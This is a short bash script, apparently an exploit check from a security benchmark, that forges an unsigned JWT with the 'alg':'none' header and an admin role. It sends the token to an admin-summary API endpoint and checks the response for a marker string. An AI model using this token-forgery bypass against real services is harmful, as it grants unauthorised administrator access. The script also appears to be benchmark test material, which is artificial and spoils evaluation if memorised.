#!/usr/bin/env bash
set -e; . "$(dirname "$0")/_lib.sh"
H=$(b64url '{"alg":"none","typ":"JWT"}')
P=$(b64url '{"sub":"forged","role":"admin","email":"jwt@bench.local"}')
curl -s -H "Authorization: Bearer $H.$P." "$TARGET/api/reports/admin-summary" | grep -q 'ADMIN-SUMMARY-ASPNET'
